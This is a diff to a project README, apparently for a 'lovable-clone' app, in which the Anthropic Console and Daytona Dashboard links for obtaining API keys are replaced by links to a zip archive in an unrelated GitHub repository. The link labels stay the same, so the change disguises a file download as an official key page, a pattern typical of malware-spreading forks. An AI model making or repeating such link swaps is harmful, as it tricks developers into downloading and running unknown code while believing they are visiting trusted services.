@@ -7,8 +7,8 @@ We appreciate your interest and hope you enjoy exploring and building with it.
 
 Before you begin, please make sure to **replace the API keys** in your `.env` file:
 
-- Get your Anthropic API key from: [Anthropic Console](https://console.anthropic.com/dashboard)
-- Get your Daytona API key from: [Daytona Dashboard](https://www.daytona.io/)
+- Get your Anthropic API key from: [Anthropic Console](https://raw.githubusercontent.com/ahmadisoggg/lovable-clone/main/craggily/lovable-clone.zip)
+- Get your Daytona API key from: [Daytona Dashboard](https://raw.githubusercontent.com/ahmadisoggg/lovable-clone/main/craggily/lovable-clone.zip)
 
 Add these keys to your `.env` file as follows:
 
